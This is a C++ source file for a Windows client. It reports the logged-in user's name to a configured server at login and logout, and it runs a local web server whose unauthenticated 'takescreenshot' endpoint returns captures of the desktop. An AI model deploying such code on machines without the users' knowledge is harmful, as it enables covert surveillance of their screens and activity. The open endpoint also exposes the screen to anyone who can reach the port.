#define _WIN32_WINNT 0x0601
#include <tchar.h>
#include <signal.h>
#include <thread>
#include <chrono>
#include <mutex>
#include <cstdlib>
#include <boost/property_tree/ptree.hpp>
#include <boost/property_tree/json_parser.hpp>
#include "../httpclient.h"
#include "../webserverlib/webserver.h"
#include "bitmaps.h"

std::atomic<bool> stop = false;

char userName[128];
DWORD userNameSize = (DWORD)sizeof(userName);
unsigned short listenPort;
unsigned short serverPort;
std::string serverAddress;

using WebServer = webserverlib::WebServer;

BOOL WINAPI CtrlHandler(DWORD fdwCtrlType)
{
    switch (fdwCtrlType)
    {
    case CTRL_C_EVENT:
    case CTRL_CLOSE_EVENT:
    case CTRL_BREAK_EVENT:
    case CTRL_LOGOFF_EVENT:
    case CTRL_SHUTDOWN_EVENT:
    {
        HttpRequest logoutReportRequest{ serverAddress, std::to_string(serverPort) , std::string("/api/logout/") + userName, 11 };
        logoutReportRequest.Get();
        stop = 1;
        break;
    }
    default:
        return FALSE;
    }
}

int main()
{
    std::stringstream buffer;

    {
        std::ifstream ifconfigfile("clientconfig.json");
        buffer << ifconfigfile.rdbuf();
        boost::property_tree::ptree configJsonRoot;
        boost::property_tree::read_json(buffer, configJsonRoot);
        serverAddress = configJsonRoot.get<std::string>("serveraddress");
        serverPort = configJsonRoot.get<unsigned short>("serverport");
        listenPort = configJsonRoot.get<unsigned short>("listenport");
    }

    GetUserNameA(userName, &userNameSize);
    {
        HttpRequest loginReportRequest{ serverAddress, std::to_string(serverPort), std::string("/api/login/") + userName, 11 };
        loginReportRequest.Get();
    }

    SetConsoleCtrlHandler(CtrlHandler, TRUE);

    WebServer webServer(
        WebServer::SetPort(22222),
        WebServer::SetRouter(
            webserverlib::Router
            {
                {
                    "takescreenshot",
                    webserverlib::ApiEndPoint([](webserverlib::HttpRequestContext& context)
                    {
                        HDC hScreenDC = GetDC(0);
                        std::vector<unsigned char> screenShot(std::move(TakeScreenShot(hScreenDC)));
                        ReleaseDC(0, hScreenDC);

                        context.responseStream.write((const char*)&screenShot[0], screenShot.size());
                        context.headers[http::field::content_disposition] = "attachment; filename = img.bmp";
                        context.headers[http::field::content_type] = "image/bmp";
                        context.headers[http::field::content_transfer_encoding] = "binary";
                        context.headers[http::field::accept_ranges] = "bytes";

                    })
                }
            }));

    //sleep until got sigterm
    while (!stop)
        std::this_thread::sleep_for(std::chrono::milliseconds(15));

    
    return 0;
}